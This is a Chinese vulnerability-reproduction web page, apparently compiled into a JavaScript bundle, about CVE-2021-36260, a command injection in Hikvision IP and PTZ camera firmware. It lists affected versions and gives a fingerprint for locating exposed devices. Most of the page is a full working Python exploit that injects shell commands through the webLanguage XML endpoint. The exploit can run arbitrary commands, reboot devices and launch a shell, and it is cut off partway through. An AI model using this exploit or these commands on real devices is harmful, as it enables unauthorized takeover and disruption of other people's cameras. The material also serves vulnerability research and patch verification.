import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>海康威视部分产品中的web模块存在一个命令注入漏洞，由于对输入参数校验不充分，攻击者可以发送带有恶意命令的报文到受影响设备，成功利用此漏洞可以导致命令执行。海康威视已发布版本修复该漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><ol><li>易受攻击的网络摄像机固件</li></ol><table><thead><tr><th><strong>产品类型</strong></th><th><strong>影响版本</strong></th></tr></thead><tbody><tr><td>IPC_E0</td><td>IPC_E0_CN_STD_5.4.6_180112</td></tr><tr><td>IPC_E1</td><td>未知</td></tr><tr><td>IPC_E2</td><td>IPC_E2_EN_STD_5.5.52_180620</td></tr><tr><td>IPC_E4</td><td>未知</td></tr><tr><td>IPC_E6</td><td>IPCK_E6_EN_STD_5.5.100_200226</td></tr><tr><td>IPC_E7</td><td>IPCK_E7_EN_STD_5.5.120_200604</td></tr><tr><td>IPC_G3</td><td>IPC_G3_EN_STD_5.5.160_210416</td></tr><tr><td>IPC_G5</td><td>IPC_G5_EN_STD_5.5.113_210317</td></tr><tr><td>IPC_H1</td><td>IPC_H1_EN_STD_5.4.61_181204</td></tr><tr><td>IPC_H5</td><td>IPCP_H5_EN_STD_5.5.85_201120</td></tr><tr><td>IPC_H8</td><td>Factory installed firmware mid 2021</td></tr><tr><td>IPC_R2</td><td>IPC_R2_EN_STD_V5.4.81_180203</td></tr></tbody></table><ol start="2"><li>易受攻击的 PTZ 摄像机固件</li></ol><table><thead><tr><th><strong>产品类型</strong></th><th><strong>影响版本</strong></th></tr></thead><tbody><tr><td>IPD_E7</td><td>IPDEX_E7_EN_STD_5.6.30_210526</td></tr><tr><td>IPD_G3</td><td>IPDES_G3_EN_STD_5.5.42_210106</td></tr><tr><td>IPD_H5</td><td>IPD_H5_EN_STD_5.5.41_200911</td></tr><tr><td>IPD_H7</td><td>IPD_H7_EN_STD_5.5.40_200721</td></tr><tr><td>IPD_H8</td><td>IPD_H8_EN_STD_5.7.1_210619</td></tr></tbody></table><ol start="3"><li>易受攻击的旧固件</li></ol><table><thead><tr><th><strong>产品类型</strong></th><th><strong>影响版本</strong></th></tr></thead><tbody><tr><td>IPC_R7</td><td>5.4.x</td></tr><tr><td>IPD_R7</td><td>5.4.x</td></tr><tr><td>IPC_G0</td><td>5.4.x</td></tr><tr><td>IPC_H3</td><td>5.4.x</td></tr><tr><td>IPD_H3</td><td>5.4.x</td></tr></tbody></table><ol start="4"><li>OEM 固件</li></ol><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;671-1e0-587ec4a1&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191713359.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>基于POC执行以下命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CVE-2021-36260.py --rhost 127.0.0.1 --rport 8081 --cmd &quot;ls&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191724307.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span>
<span class="token comment"># Exploit Author: bashis</span>
<span class="token comment"># Vendor Homepage: https://www.Hikvision.com/</span>
<span class="token comment"># Version: 1.0</span>
<span class="token comment"># CVE: CVE-2021-36260</span>
<span class="token comment"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span>

<span class="token comment"># All credit to Watchful_IP</span>

<span class="token comment">#!/usr/bin/env python3</span>

<span class="token triple-quoted-string string">&quot;&quot;&quot;
Note:
1)  This code will _not_ verify if remote is Hikvision device or not.
2)  Most of my interest in this code has been concentrated on how to
    reliably detect vulnerable and/or exploitable devices.
    Some devices are easy to detect, verify and exploit the vulnerability,
    other devices may be vulnerable but not so easy to verify and exploit.
    I think the combined verification code should have very high accuracy.
3)  &#39;safe check&#39; (--check) will try write and read for verification
    &#39;unsafe check&#39; (--reboot) will try reboot the device for verification

[Examples]
Safe vulnerability/verify check:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check

Safe and unsafe vulnerability/verify check:
(will only use &#39;unsafe check&#39; if not verified with &#39;safe check&#39;)
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot

Unsafe vulnerability/verify check:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot

Launch and connect to SSH shell:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell

Execute command:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;

Execute blind command:
    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;

$./CVE-2021-36260.py -h
[*] Hikvision CVE-2021-36260
[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)
usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]
                         [--reboot] [--shell] [--cmd CMD]
                         [--cmd_blind CMD_BLIND] [--noverify]
                         [--proto {http,https}]

optional arguments:
  -h, --help            show this help message and exit
  --rhost RHOST         Remote Target Address (IP/FQDN)
  --rport RPORT         Remote Target Port
  --check               Check if vulnerable
  --reboot              Reboot if vulnerable
  --shell               Launch SSH shell
  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)
  --cmd_blind CMD_BLIND
                        execute blind cmd (i.e: &quot;reboot&quot;)
  --noverify            Do not verify if vulnerable
  --proto {http,https}  Protocol used
$
&quot;&quot;&quot;</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> time

<span class="token keyword">import</span> requests
<span class="token keyword">from</span> requests <span class="token keyword">import</span> packages
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages <span class="token keyword">import</span> urllib3
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3 <span class="token keyword">import</span> exceptions


<span class="token keyword">class</span> <span class="token class-name">Http</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> rhost<span class="token punctuation">,</span> rport<span class="token punctuation">,</span> proto<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>Http<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>rhost <span class="token operator">=</span> rhost
        self<span class="token punctuation">.</span>rport <span class="token operator">=</span> rport
        self<span class="token punctuation">.</span>proto <span class="token operator">=</span> proto
        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout

        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token boolean">None</span>
        self<span class="token punctuation">.</span>uri <span class="token operator">=</span> <span class="token boolean">None</span>

        <span class="token triple-quoted-string string">&quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>_init_uri<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token string">&#39;Host&#39;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span>
            <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;X-Requested-With&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;XMLHttpRequest&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;gzip, deflate&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;en-US,en;q=0.9,sv;q=0.8&#39;</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;
        self.remote.proxies.update({
            # &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;,
        })
        &quot;&quot;&quot;</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token keyword">if</span> query_args<span class="token punctuation">:</span>
            <span class="token triple-quoted-string string">&quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>query_args<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">22</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[!] Error: Command &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>query_args<span class="token punctuation">}</span></span><span class="token string">&quot; to long (</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_args<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)&#39;</span></span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">None</span>

        <span class="token triple-quoted-string string">&quot;&quot;&quot;This weird code will try automatically switch between http/https
        and update Host
        &quot;&quot;&quot;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>
                <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&#39;/SDK/webLanguage&#39;</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token string">&#39;https&#39;</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">==</span> <span class="token string">&#39;http&#39;</span> <span class="token keyword">else</span> <span class="token string">&#39;https&#39;</span>
            self<span class="token punctuation">.</span>_init_uri<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&#39;/SDK/webLanguage&#39;</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>
            <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>

        <span class="token triple-quoted-string string">&quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span>

        <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>
            redirect <span class="token operator">=</span> data<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>uri <span class="token operator">=</span> redirect<span class="token punctuation">[</span><span class="token punctuation">:</span>redirect<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            self<span class="token punctuation">.</span>_update_host<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>
                <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&#39;/SDK/webLanguage&#39;</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>

        <span class="token keyword">return</span> data

    <span class="token keyword">def</span> <span class="token function">_update_host</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;Host&#39;</span><span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>uri<span class="token punctuation">[</span>self<span class="token punctuation">.</span>uri<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>
                <span class="token string">&#39;Host&#39;</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>uri<span class="token punctuation">[</span>self<span class="token punctuation">.</span>uri<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_init_uri</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>uri <span class="token operator">=</span> <span class="token string">&#39;{proto}://{rhost}:{rport}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>proto<span class="token operator">=</span>self<span class="token punctuation">.</span>proto<span class="token punctuation">,</span> rhost<span class="token operator">=</span>self<span class="token punctuation">.</span>rhost<span class="token punctuation">,</span> rport<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span>
        query_args <span class="token operator">=</span> <span class="token string">&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39;</span> \\
                     <span class="token string-interpolation"><span class="token string">f&#39;&lt;language&gt;$(</span><span class="token interpolation"><span class="token punctuation">{</span>query_args<span class="token punctuation">}</span></span><span class="token string">)&lt;/language&gt;&#39;</span></span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>put<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uri <span class="token operator">+</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>query_args<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uri <span class="token operator">+</span> url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    status_code == 200 (OK);
        Verified vulnerable and exploitable
    status_code == 500 (Internal Server Error);
        Device may be vulnerable, but most likely not
        The SDK webLanguage tag is there, but generate status_code 500 when language not found
        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)
        (Issue: Could also be other directory than &#39;webLib&#39;, r/o FS etc...)
    status_code == 401 (Unauthorized);
        Defiantly not vulnerable
    &quot;&quot;&quot;</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>noverify<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[*] Not verifying remote &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[*] Checking remote &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] Cannot establish connection to &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[i] ETag:&#39;</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;ETag&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;&gt;webLib/c&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&quot; do not looks like Hikvision&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    status_code <span class="token operator">=</span> data<span class="token punctuation">.</span>status_code

    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&#39;/c&#39;</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span>
        <span class="token keyword">if</span> status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] Could not verify if vulnerable (Code: </span><span class="token interpolation"><span class="token punctuation">{</span>status_code<span class="token punctuation">}</span></span><span class="token string">)&#39;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>reboot<span class="token punctuation">:</span>
                <span class="token keyword">return</span> check_reboot<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[+] Remote is not vulnerable (Code: </span><span class="token interpolation"><span class="token punctuation">{</span>status_code<span class="token punctuation">}</span></span><span class="token string">)&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Remote is verified exploitable&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">check_reboot</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    We sending &#39;reboot&#39;, wait 2 sec, then checking with GET request.
    - if there is data returned, we can assume remote is not vulnerable.
    - If there is no connection or data returned, we can assume remote is vulnerable.
    &quot;&quot;&quot;</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>check<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[i] Checking if vulnerable with &quot;reboot&quot;&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[*] Checking remote &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">&quot; with &quot;reboot&quot;&#39;</span></span><span class="token punctuation">)</span>
    remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">&#39;reboot&#39;</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Remote is vulnerable&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Remote is not vulnerable&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">}</span></span><span class="token string">&gt;webLib/x&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&#39;/x&#39;</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[!] Error execute cmd &quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">cmd_blind</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Blind command injection
    &quot;&quot;&quot;</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
